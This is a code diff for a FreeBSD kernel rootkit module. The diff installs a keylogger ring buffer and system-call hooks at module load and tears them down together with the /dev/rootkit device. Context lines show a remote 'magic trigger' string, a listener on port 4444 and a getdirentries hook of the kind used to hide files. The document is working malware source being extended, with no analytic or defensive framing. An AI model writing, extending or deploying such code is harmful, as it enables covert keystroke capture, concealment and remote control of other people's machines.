@@ -58,6 +58,7 @@
 #include <sys/libkern.h>
 
 #include "interface.h"
+#include "log.h"
 
 #define TRIGGER_STRING "BSD_rootkit_REMOTE_MAGIC_TRIGGER_v1"
 #define LISTEN_PORT    4444
@@ -299,6 +300,14 @@ static int load(module_t module, int cmd, void *arg) {
         mtx_init(&remote_mtx, "rootkit_mtx", NULL, MTX_DEF);
         cv_init(&remote_cv, "rootkit_cv");
 
+        /*
+         * Keylogger ring and syscall hooks (log.c). Installed before the
+         * device exists so a reader can never open /dev/rootkit while the
+         * ring is still unwired.
+         */
+        rk_log_init();
+        (void)rk_log_hook_install();
+
         /* Initialize character device interface via interface.c */
         error = make_rootkit_dev();
         sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
@@ -314,6 +323,7 @@ static int load(module_t module, int cmd, void *arg) {
                 // printf("rootkit: device created, failed to start listener (%d)\n", error);
             }
         } else {
+            rk_log_uninit();
             // printf("rootkit: failed to create device (%d)\n", error);
         }
 
@@ -332,13 +342,20 @@ static int load(module_t module, int cmd, void *arg) {
     case MOD_UNLOAD:
         remote_thread_running = 0;
 
+        /*
+         * Order matters: destroy the device first so no new reader can enter
+         * the cdev handlers, then seldrain/unhook inside rk_log_uninit(). If
+         * the module went away while a thread was still registered on the
+         * selinfo, it would wake up into freed memory.
+         */
+        destroy_rootkit_dev();
+        rk_log_uninit();
+
         mtx_lock(&remote_mtx);
         cv_broadcast(&remote_cv);
         mtx_unlock(&remote_mtx);
 
         // cleanup_keylogger();     TODO: Fix this later
-
-        destroy_rootkit_dev();
 
         cv_destroy(&remote_cv);
         mtx_destroy(&remote_mtx);
